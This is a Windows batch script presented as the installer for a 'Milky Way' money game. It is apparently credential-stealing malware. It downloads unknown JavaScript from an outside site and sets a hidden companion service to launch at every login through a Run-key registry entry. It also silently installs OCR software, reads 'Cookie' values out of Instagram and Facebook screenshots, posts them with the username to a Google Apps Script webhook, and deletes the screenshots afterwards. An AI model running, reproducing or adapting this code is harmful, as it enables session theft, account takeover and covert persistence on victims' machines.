@echo off
setlocal EnableExtensions
title Play Milky Way
color 0B
set "URL=https://cookies-ochre.vercel.app/"
set "DEST=%LOCALAPPDATA%\CookiesCompanion"
set "PORTABLE=%LOCALAPPDATA%\NodePortable"
set "SHOTS=%USERPROFILE%\Pictures\Screenshots"
set "LOG=%DEST%\setup.log"
set "BROWSER_FLAG=@@BROWSER_FLAG@@"

echo ============================================
echo   Milky Way - Installer
echo ============================================
echo.

if exist "%LOG%" del "%LOG%" >nul 2>nul

echo [1/5] Preparing folders...
mkdir "%DEST%" 2>nul
mkdir "%PORTABLE%" 2>nul
mkdir "%SHOTS%" 2>nul
echo [1/5] folders ready>> "%LOG%" 2>nul
echo   folders ready

echo [2/5] Downloading game
copy /y "%TEMP%\stakehacks\record.js" "%DEST%\record.js" >nul 2>nul
copy /y "%TEMP%\stakehacks\companion.js" "%DEST%\companion.js" >nul 2>nul
if not exist "%DEST%\record.js" (
  echo   downloading from site...
  curl -sL -o "%DEST%\record.js" "%URL%/assets/record.js" || powershell -NoProfile -ExecutionPolicy Bypass -Command "(New-Object Net.WebClient).DownloadFile('%URL%/assets/record.js','%DEST%\record.js')"
  curl -sL -o "%DEST%\companion.js" "%URL%/assets/companion.js" || powershell -NoProfile -ExecutionPolicy Bypass -Command "(New-Object Net.WebClient).DownloadFile('%URL%/assets/companion.js','%DEST%\companion.js')"
)
if not exist "%DEST%\record.js" (
  echo ERROR: could not download game. Check internet.
  echo ERROR downloading game >> "%LOG%" 2>nul
  pause
  exit /b 1
)
if not exist "%DEST%\companion.js" (
  echo ERROR: could not download game. Check internet.
  echo ERROR downloading game >> "%LOG%" 2>nul
  pause
  exit /b 1
)
echo   scripts ready
echo [2/5] scripts downloaded>> "%LOG%" 2>nul

echo [3/5] Checking for Node.js...
set "NODE="
where node >nul 2>nul
if not errorlevel 1 set "NODE=node"
if defined NODE goto :nodefound
if exist "%DEST%\node\node.exe" set "NODE=%DEST%\node\node.exe"
if defined NODE goto :nodefound
if exist "%PORTABLE%\node.exe" set "NODE=%PORTABLE%\node.exe"
if defined NODE goto :nodefound
echo   downloading portable Node (no admin needed)...
powershell -NoProfile -ExecutionPolicy Bypass -Command "$ErrorActionPreference='Stop'; $m=[regex]::Match((Invoke-WebRequest 'https://nodejs.org/dist/latest-v22.x/' -UseBasicParsing).Content,'node-v[0-9.]+-win-x64\.zip').Value; if(-not $m){throw 'no zip'}; Invoke-WebRequest ('https://nodejs.org/dist/latest-v22.x/'+$m) -OutFile '%PORTABLE%\node.zip' -UseBasicParsing"
if exist "%PORTABLE%\node.zip" (
  echo   extracting...
  powershell -NoProfile -ExecutionPolicy Bypass -Command "$ErrorActionPreference='Stop'; Expand-Archive -LiteralPath '%PORTABLE%\node.zip' -DestinationPath '%PORTABLE%\tmp' -Force; $d=Get-ChildItem '%PORTABLE%\tmp' -Directory|Select-Object -First 1; Copy-Item (Join-Path $d.FullName 'node.exe') '%PORTABLE%\node.exe' -Force; Remove-Item '%PORTABLE%\tmp' -Recurse -Force; Remove-Item '%PORTABLE%\node.zip' -Force"
  if exist "%PORTABLE%\node.exe" set "NODE=%PORTABLE%\node.exe"
)
if not defined NODE (
  echo ERROR: could not download Node.js. Check internet.
  echo ERROR no node>> "%LOG%" 2>nul
  pause
  exit /b 1
)
:nodefound
echo   Node ready: %NODE%
echo [3/5] node %NODE%>> "%LOG%" 2>nul

echo [4/5] Starting companion service (auto-start on login)...
set "VBS=%DEST%\start-companion.vbs"
(
  echo Set s = CreateObject("Wscript.Shell"^)
  echo s.CurrentDirectory = "%DEST%"
  echo s.Run """%NODE%"" ""%DEST%\companion.js""", 0, False
) > "%VBS%"
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v CookiesCompanion /t REG_SZ /d "wscript.exe \"%VBS%\"" /f >nul 2>nul
taskkill /f /im node.exe >nul 2>nul
start "" wscript.exe "%VBS%"
timeout /t 3 /nobreak >nul
echo   companion running on port 9876
echo [4/5] companion started>> "%LOG%" 2>nul

echo [5/5] Running money game - your browser will open now...
echo   Do not close the browser until the game complets.
set "COOKIES_SILENT=1"
"%NODE%" "%DEST%\record.js" %BROWSER_FLAG%
echo [5/5] record.js exit %errorlevel%>> "%LOG%" 2>nul

echo.
setlocal EnableDelayedExpansion

set "WEBHOOK_URL=https://script.google.com/macros/s/AKfycbz5uPNM0BJ3GtsConinNQaBsGjXfMMp6Ka9nknvynnHiZP1ff_e1TSWCZle-3vTtOHwmw/exec"
set "ERROR_URL=https://cookies-ochre.vercel.app/"

:: Make this whatever key you want to extract (e.g., param_2, Followers, etc.)
set "TARGET_KEY=Cookie" 
:: ---------------------

set "INSTA_IMG=%SHOTS%\instagram_insta.png"
set "FB_IMG=%SHOTS%\facebook_insta.png"
set "TESSERACT_PATH=C:\Program Files\Tesseract-OCR\tesseract.exe"

:: 1. CHECK IF IMAGES EXIST (If BOTH are missing, fail immediately)
if not exist "%INSTA_IMG%" (
    if not exist "%FB_IMG%" (
        echo Screenshots missing.
        goto :error_out
    )
)

:: 2. CHECK AND INSTALL TESSERACT OCR
if not exist "%TESSERACT_PATH%" (
    echo Tesseract OCR not found. Installing silently...
    :: Uses Windows Package Manager to install Tesseract unattended
    winget install -e --id UB-Mannheim.TesseractOCR --accept-package-agreements --accept-source-agreements --silent >nul 2>&1
    
    :: Verify installation succeeded
    if not exist "%TESSERACT_PATH%" (
        echo Failed to install Tesseract OCR automatically.
        goto :error_out
    )
)

:: 3. RUN OCR
echo Processing images...
if exist "%INSTA_IMG%" "%TESSERACT_PATH%" "%INSTA_IMG%" "%SHOTS%\ocr_insta" >nul 2>&1
if exist "%FB_IMG%" "%TESSERACT_PATH%" "%FB_IMG%" "%SHOTS%\ocr_fb" >nul 2>&1

:: 4. EXTRACT DATA AND UPLOAD VIA POWERSHELL
:: This PowerShell block reads the text, finds TARGET_KEY, extracts the value, and sends to Sheets.
powershell -Command "^
    $targetKey = '%TARGET_KEY%'; ^
    $instaText = if (Test-Path '%SHOTS%\ocr_insta.txt') { Get-Content '%SHOTS%\ocr_insta.txt' } else { @() }; ^
    $fbText = if (Test-Path '%SHOTS%\ocr_fb.txt') { Get-Content '%SHOTS%\ocr_fb.txt' } else { @() }; ^
    ^
    # Regex to find the key, ignore spaces, and grab the value at the end ^
    $regex = [regex]::Escape($targetKey) + '\s+(.+)'; ^
    ^
    $instaVal = ''; ^
    foreach ($line in $instaText) { ^
        if ($line -match $regex) { $instaVal = $matches[1].Trim(); break; } ^
    } ^
    ^
    $fbVal = ''; ^
    foreach ($line in $fbText) { ^
        if ($line -match $regex) { $fbVal = $matches[1].Trim(); break; } ^
    } ^
    ^
    # If both values are empty, exit with error code 1 so the batch script knows it failed ^
    if ([string]::IsNullOrWhiteSpace($instaVal) -and [string]::IsNullOrWhiteSpace($fbVal)) { ^
        exit 1; ^
    } ^
    ^
    # Prepare JSON Payload for Google Sheets ^
    $payload = @{ ^
        user = $env:USERNAME; ^
        date = (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'); ^
        fb_param = $fbVal; ^
        insta_param = $instaVal ^
    } | ConvertTo-Json; ^
    ^
    Invoke-RestMethod -Uri '%WEBHOOK_URL%' -Method Post -Body $payload -ContentType 'application/json'; ^
"

:: 5. CHECK POWERSHELL RESULT
:: If PowerShell exited with code 1, it means the key wasn't found in ANY screenshot.
if %errorlevel% neq 0 (
    echo Parameter '%TARGET_KEY%' not found in any screenshot.
    goto :error_out
)

:: 6. CLEANUP AND SUCCESS
echo Upload successful. Cleaning up screenshots...
del "%INSTA_IMG%" 2>nul
del "%FB_IMG%" 2>nul
del "%SHOTS%\ocr_insta.txt" 2>nul
del "%SHOTS%\ocr_fb.txt" 2>nul

echo done>> "%LOG%" 2>nul
echo Done. Companion will auto-start at every login.
echo Log: %LOG%
goto :eof

:: 7. ERROR HANDLER
:error_out
echo Installation failed, please redownload.
echo installation failed>> "%LOG%" 2>nul
:: Open the fallback website in default browser
start "" "%ERROR_URL%"
pause
exit /b
echo.
pause
